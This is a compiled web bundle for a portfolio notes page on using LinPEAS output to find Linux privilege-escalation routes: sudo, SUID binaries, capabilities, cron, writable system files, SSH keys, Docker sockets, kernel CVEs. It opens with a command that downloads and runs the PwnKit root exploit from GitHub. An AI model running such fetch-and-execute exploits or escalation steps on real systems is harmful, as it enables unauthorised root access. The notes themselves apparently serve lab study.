"use strict";(globalThis.webpackChunkportfolio=globalThis.webpackChunkportfolio||[]).push([[1047],{6482:(e,s,n)=>{n.r(s),n.d(s,{assets:()=>d,contentTitle:()=>o,default:()=>x,frontMatter:()=>l,metadata:()=>i,toc:()=>t});const i=JSON.parse('{"id":"procedure/LinPEAS","title":"LinPEAS","description":"If vulnerable to pwnkit//raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)\\"","source":"@site/docs/procedure/LinPEAS.md","sourceDirName":"procedure","slug":"/procedure/LinPEAS","permalink":"/portfolio/docs/procedure/LinPEAS","draft":false,"unlisted":false,"tags":[],"version":"current","lastUpdatedAt":1765120889000,"frontMatter":{},"sidebar":"docsSidebar","previous":{"title":"Ignore","permalink":"/portfolio/docs/procedure/Ignore"},"next":{"title":"MongoDB","permalink":"/portfolio/docs/procedure/MongoDB"}}');var r=n(4848),c=n(8453);const l={},o=void 0,d={},t=[{value:"look out for \u201cChecking &#39;sudo -l&#39;, /etc/sudoers, and /etc/sudoers.d&quot;",id:"look-out-for-checking-sudo--l-etcsudoers-and-etcsudoersd",level:2},{value:"Check files with interesting perms \u2192 SUID and SGID section.",id:"check-files-with-interesting-perms--suid-and-sgid-section",level:2},{value:"<strong>Quick Checklist for LinPEAS:</strong>",id:"quick-checklist-for-linpeas",level:3},{value:"<strong>1. High-Criticality Sections (Focus First)</strong>",id:"1-high-criticality-sections-focus-first",level:3},{value:"<strong>2. Medium-Criticality Sections (Check After)</strong>",id:"2-medium-criticality-sections-check-after",level:3},{value:"<strong>3. Low-Criticality Sections (Last Check)</strong>",id:"3-low-criticality-sections-last-check",level:3}];function h(e){const s={code:"code",h2:"h2",h3:"h3",li:"li",ol:"ol",p:"p",strong:"strong",table:"table",tbody:"tbody",td:"td",th:"th",thead:"thead",tr:"tr",ul:"ul",...(0,c.R)(),...e.components},{Details:n}=s;return n||function(e,s){throw new Error("Expected "+(s?"component":"object")+" `"+e+"` to be defined: you likely forgot to import, pass, or provide it.")}("Details",!0),(0,r.jsxs)(r.Fragment,{children:[(0,r.jsxs)(s.p,{children:["If vulnerable to pwnkit: ",(0,r.jsx)(s.code,{children:'sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"'})]}),"\n",(0,r.jsx)(s.h2,{id:"look-out-for-checking-sudo--l-etcsudoers-and-etcsudoersd",children:"look out for \u201cChecking 'sudo -l', /etc/sudoers, and /etc/sudoers.d\""}),"\n",(0,r.jsx)(n,{children:(0,r.jsx)(s.p,{children:"search vuln application with GTFOBins, scroll down to \u2018sudo\u2019 section"})}),"\n",(0,r.jsx)(s.h2,{id:"check-files-with-interesting-perms--suid-and-sgid-section",children:"Check files with interesting perms \u2192 SUID and SGID section."}),"\n",(0,r.jsx)(s.p,{children:"if section is empty run find / -perm -4000 2>/dev/null"}),"\n",(0,r.jsxs)(n,{children:[(0,r.jsx)(s.p,{children:"Standard files that cannot be exploited:"}),(0,r.jsxs)(n,{children:[(0,r.jsx)(s.p,{children:"Exceptions:"}),(0,r.jsx)(n,{children:(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsxs)(s.li,{children:[(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"sudo"})}),": If misconfigured (",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"sudo -l"})}),"\xa0allows running arbitrary commands)."]}),"\n",(0,r.jsxs)(s.li,{children:[(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"pkexec"})}),": If vulnerable to\xa0",(0,r.jsx)(s.strong,{children:"CVE-2021-4034 (PwnKit)"}),"."]}),"\n",(0,r.jsxs)(s.li,{children:[(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"passwd"})}),": If you can manipulate\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"/etc/passwd"})}),"\xa0or environment variables."]}),"\n"]})}),(0,r.jsxs)(s.table,{children:[(0,r.jsx)(s.thead,{children:(0,r.jsxs)(s.tr,{children:[(0,r.jsx)(s.th,{children:"Binary"}),(0,r.jsx)(s.th,{children:"Why It's Usually Safe"})]})}),(0,r.jsxs)(s.tbody,{children:[(0,r.jsxs)(s.tr,{children:[(0,r.jsx)(s.td,{children:"ping"}),(0,r.jsx)(s.td,{children:"Drops privileges when run."})]}),(0,r.jsxs)(s.tr,{children:[(0,r.jsx)(s.td,{children:"su"}),(0,r.jsx)(s.td,{children:"Legitimate use for switching users."})]}),(0,r.jsxs)(s.tr,{children:[(0,r.jsx)(s.td,{children:"sudo"}),(0,r.jsx)(s.td,{children:"Requires password/configuration to escalate."})]}),(0,r.jsxs)(s.tr,{children:[(0,r.jsx)(s.td,{children:"mount"}),(0,r.jsxs)(s.td,{children:["Needs ",(0,r.jsx)(s.code,{children:"root"})," or proper ",(0,r.jsx)(s.code,{children:"/etc/fstab"})," entries."]})]}),(0,r.jsxs)(s.tr,{children:[(0,r.jsx)(s.td,{children:"umount"}),(0,r.jsxs)(s.td,{children:["Same as ",(0,r.jsx)(s.code,{children:"mount"}),"."]})]}),(0,r.jsxs)(s.tr,{children:[(0,r.jsx)(s.td,{children:"passwd"}),(0,r.jsx)(s.td,{children:"Only allows changing the user's own password."})]}),(0,r.jsxs)(s.tr,{children:[(0,r.jsx)(s.td,{children:"chsh"}),(0,r.jsx)(s.td,{children:"Only allows changing the user's own shell."})]}),(0,r.jsxs)(s.tr,{children:[(0,r.jsx)(s.td,{children:"chfn"}),(0,r.jsx)(s.td,{children:"Only allows changing user info."})]}),(0,r.jsxs)(s.tr,{children:[(0,r.jsx)(s.td,{children:"pkexec"}),(0,r.jsx)(s.td,{children:"Requires policykit rules (unless vulnerable to CVE-2021-4034)."})]}),(0,r.jsxs)(s.tr,{children:[(0,r.jsx)(s.td,{children:"gpasswd"}),(0,r.jsx)(s.td,{children:"Only manages group memberships (with restrictions)."})]}),(0,r.jsxs)(s.tr,{children:[(0,r.jsx)(s.td,{children:"newgrp"}),(0,r.jsx)(s.td,{children:"Only changes the effective group ID."})]}),(0,r.jsxs)(s.tr,{children:[(0,r.jsx)(s.td,{children:"traceroute"}),(0,r.jsx)(s.td,{children:"Often drops privileges."})]}),(0,r.jsxs)(s.tr,{children:[(0,r.jsx)(s.td,{children:"bsd-write"}),(0,r.jsx)(s.td,{children:"Only allows sending messages to other users."})]})]})]})]})]}),"\n",(0,r.jsx)(s.p,{children:"Other files which seem unexploitable from previous exercises: fusermount3"}),"\n",(0,r.jsx)(s.p,{children:"for anything else u find, go to gtfobins and look under \u2018suid\u2019 section"}),"\n",(0,r.jsx)(s.p,{children:"Deepseek's (more comprehensive) Guide"}),"\n",(0,r.jsxs)(n,{children:[(0,r.jsx)(s.h3,{id:"quick-checklist-for-linpeas",children:(0,r.jsx)(s.strong,{children:"Quick Checklist for LinPEAS:"})}),(0,r.jsxs)(s.ol,{children:["\n",(0,r.jsx)(s.li,{children:(0,r.jsxs)(s.strong,{children:["Check\xa0",(0,r.jsx)(s.code,{children:"sudo -l"}),"\xa0(Can you run anything as root?)"]})}),"\n",(0,r.jsx)(s.li,{children:(0,r.jsx)(s.strong,{children:"Check SUID/SGID binaries (Can you abuse any?)"})}),"\n",(0,r.jsx)(s.li,{children:(0,r.jsx)(s.strong,{children:"Check kernel version (Is it exploitable?)"})}),"\n",(0,r.jsx)(s.li,{children:(0,r.jsxs)(s.strong,{children:["Check writable system files (",(0,r.jsx)(s.code,{children:"/etc/passwd"}),",\xa0",(0,r.jsx)(s.code,{children:"/etc/sudoers"}),")"]})}),"\n",(0,r.jsx)(s.li,{children:(0,r.jsx)(s.strong,{children:"Check cron jobs (Any writable scripts?)"})}),"\n",(0,r.jsx)(s.li,{children:(0,r.jsxs)(s.strong,{children:["Check capabilities (Any dangerous\xa0",(0,r.jsx)(s.code,{children:"setuid"}),"\xa0capabilities?)"]})}),"\n",(0,r.jsx)(s.li,{children:(0,r.jsx)(s.strong,{children:"Check processes (Any weird root processes?)"})}),"\n"]}),(0,r.jsx)(s.h3,{id:"1-high-criticality-sections-focus-first",children:(0,r.jsx)(s.strong,{children:"1. High-Criticality Sections (Focus First)"})}),(0,r.jsx)(s.p,{children:"These sections often contain quick wins or severe misconfigurations:"}),(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsxs)(s.li,{children:["Look out for any exposed passwords in environment variables or config files. E.g. ",(0,r.jsx)(s.code,{children:"AWS_SECRET_KEY"})," env variable or sth like that"]}),"\n",(0,r.jsxs)(s.li,{children:[(0,r.jsx)(s.strong,{children:"CVE Checks"}),"\n",(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsx)(s.li,{children:"Lists known vulnerabilities in the kernel/system (e.g., DirtyPipe, DirtyCow)."}),"\n",(0,r.jsxs)(s.li,{children:["Look for\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"[CVE-XXXX-XXXX]"})}),"\xa0entries and check exploitability."]}),"\n"]}),"\n"]}),"\n",(0,r.jsxs)(s.li,{children:[(0,r.jsx)(s.strong,{children:"SUDO (sudo -l)"}),"\n",(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsxs)(s.li,{children:["Check if the current user can run any commands with\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"sudo"})}),"\xa0without a password."]}),"\n",(0,r.jsxs)(s.li,{children:["Commands like\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"sudo -l"})}),"\xa0output may allow privilege escalation (e.g.,\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"sudo /bin/bash"})}),")."]}),"\n"]}),"\n"]}),"\n",(0,r.jsxs)(s.li,{children:[(0,r.jsx)(s.strong,{children:"SUID/SGID Binaries"}),"\n",(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsxs)(s.li,{children:["Look for unusual SUID/SGID files (e.g.,\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"find / -perm -4000 2>/dev/null"})}),")."]}),"\n",(0,r.jsxs)(s.li,{children:["Common risky binaries:\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"find"})}),",\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"vim"})}),",\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"bash"})}),",\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"cp"})}),",\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"nmap"})}),",\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"python"})}),",\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"perl"})}),"."]}),"\n"]}),"\n"]}),"\n",(0,r.jsxs)(s.li,{children:[(0,r.jsx)(s.strong,{children:"Capabilities"}),"\n",(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsxs)(s.li,{children:["Binaries with dangerous capabilities (e.g.,\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"cap_setuid+ep"})}),")."]}),"\n",(0,r.jsxs)(s.li,{children:["Example: If\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"/usr/bin/python"})}),"\xa0has\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"cap_setuid"})}),", it can escalate privileges."]}),"\n"]}),"\n"]}),"\n",(0,r.jsxs)(s.li,{children:[(0,r.jsx)(s.strong,{children:"Writable Files & Directories"}),"\n",(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsxs)(s.li,{children:["Check\xa0",(0,r.jsx)(s.strong,{children:"writable system files"}),"\xa0(",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"/etc/passwd"})}),",\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"/etc/sudoers"})}),",\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"/etc/crontab"})}),")."]}),"\n",(0,r.jsxs)(s.li,{children:["Writable\xa0",(0,r.jsx)(s.strong,{children:"cron jobs"}),"\xa0(",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"/etc/cron*"})}),", user crontabs)."]}),"\n"]}),"\n"]}),"\n",(0,r.jsxs)(s.li,{children:[(0,r.jsx)(s.strong,{children:"Kernel Exploits (Kernel Version)"}),"\n",(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsxs)(s.li,{children:["Check kernel version (",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"uname -a"})}),") against known exploits."]}),"\n",(0,r.jsxs)(s.li,{children:["Use tools like\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"searchsploit"})}),"\xa0or\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"linux-exploit-suggester"})}),"."]}),"\n"]}),"\n"]}),"\n",(0,r.jsxs)(s.li,{children:[(0,r.jsx)(s.strong,{children:"Processes Running as Root"}),"\n",(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsxs)(s.li,{children:["Check for unusual processes running as root (",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"ps aux | grep root"})}),")."]}),"\n",(0,r.jsxs)(s.li,{children:["Look for\xa0",(0,r.jsx)(s.strong,{children:"weak service permissions"}),"\xa0(e.g., a writable service file)."]}),"\n"]}),"\n"]}),"\n"]}),(0,r.jsx)(s.h3,{id:"2-medium-criticality-sections-check-after",children:(0,r.jsx)(s.strong,{children:"2. Medium-Criticality Sections (Check After)"})}),(0,r.jsx)(s.p,{children:"These may require more effort but can still lead to privilege escalation:"}),(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsxs)(s.li,{children:[(0,r.jsx)(s.strong,{children:"Cron Jobs"}),"\n",(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsxs)(s.li,{children:["Check for user-writable cron scripts (",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"/var/spool/cron/crontabs/"})}),")."]}),"\n",(0,r.jsx)(s.li,{children:"Look for wildcard injections in cron jobs."}),"\n"]}),"\n"]}),"\n",(0,r.jsxs)(s.li,{children:[(0,r.jsx)(s.strong,{children:"Environment Variables ($PATH)"}),"\n",(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsxs)(s.li,{children:["Check if\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"PATH"})}),"\xa0includes writable directories (could hijack binaries)."]}),"\n"]}),"\n"]}),"\n",(0,r.jsxs)(s.li,{children:[(0,r.jsx)(s.strong,{children:"NFS Shares"}),"\n",(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsxs)(s.li,{children:["If\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"no_root_squash"})}),"\xa0is enabled, you can create a SUID binary."]}),"\n"]}),"\n"]}),"\n",(0,r.jsxs)(s.li,{children:[(0,r.jsx)(s.strong,{children:"Docker / Container Escapes"}),"\n",(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsxs)(s.li,{children:["Check if inside a container (",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"/.dockerenv"})}),"\xa0exists)."]}),"\n",(0,r.jsxs)(s.li,{children:["Look for misconfigured Docker sockets (",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"/var/run/docker.sock"})}),")."]}),"\n"]}),"\n"]}),"\n",(0,r.jsxs)(s.li,{children:[(0,r.jsx)(s.strong,{children:"SSH Keys"}),"\n",(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsxs)(s.li,{children:["Check for private keys (",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"~/.ssh/id_rsa"})}),",\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"/etc/ssh/*"})}),")."]}),"\n"]}),"\n"]}),"\n"]}),(0,r.jsx)(s.h3,{id:"3-low-criticality-sections-last-check",children:(0,r.jsx)(s.strong,{children:"3. Low-Criticality Sections (Last Check)"})}),(0,r.jsx)(s.p,{children:"These may provide useful info but are less likely to lead directly to root:"}),(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsxs)(s.li,{children:[(0,r.jsxs)(s.strong,{children:["Mounted Filesystems (",(0,r.jsx)(s.code,{children:"mount"}),",\xa0",(0,r.jsx)(s.code,{children:"df -h"}),")"]}),"\n",(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsxs)(s.li,{children:["Check for misconfigured permissions (",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"noexec"})}),",\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"nosuid"})}),"\xa0missing)."]}),"\n"]}),"\n"]}),"\n",(0,r.jsxs)(s.li,{children:[(0,r.jsx)(s.strong,{children:"Users & Groups"}),"\n",(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsxs)(s.li,{children:["Check for unexpected users in\xa0",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"sudo"})}),"/",(0,r.jsx)(s.strong,{children:(0,r.jsx)(s.code,{children:"admin"})}),"\xa0groups."]}),"\n"]}),"\n"]}),"\n",(0,r.jsxs)(s.li,{children:[(0,r.jsx)(s.strong,{children:"Network Information (Interfaces, ARP, Connections)"}),"\n",(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsx)(s.li,{children:"May help in lateral movement but not direct priv esc."}),"\n"]}),"\n"]}),"\n",(0,r.jsxs)(s.li,{children:[(0,r.jsx)(s.strong,{children:"Installed Software (dpkg -l, rpm -qa)"}),"\n",(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsx)(s.li,{children:"Look for vulnerable versions of services (e.g., MySQL, Apache)."}),"\n"]}),"\n"]}),"\n"]})]})]})}function x(e={}){const{wrapper:s}={...(0,c.R)(),...e.components};return s?(0,r.jsx)(s,{...e,children:(0,r.jsx)(h,{...e})}):h(e)}},8453:(e,s,n)=>{n.d(s,{R:()=>l,x:()=>o});var i=n(6540);const r={},c=i.createContext(r);function l(e){const s=i.useContext(c);return i.useMemo(function(){return"function"==typeof e?e(s):{...s,...e}},[s,e])}function o(e){let s;return s=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:l(e.components),i.createElement(c.Provider,{value:s},e.children)}}}]);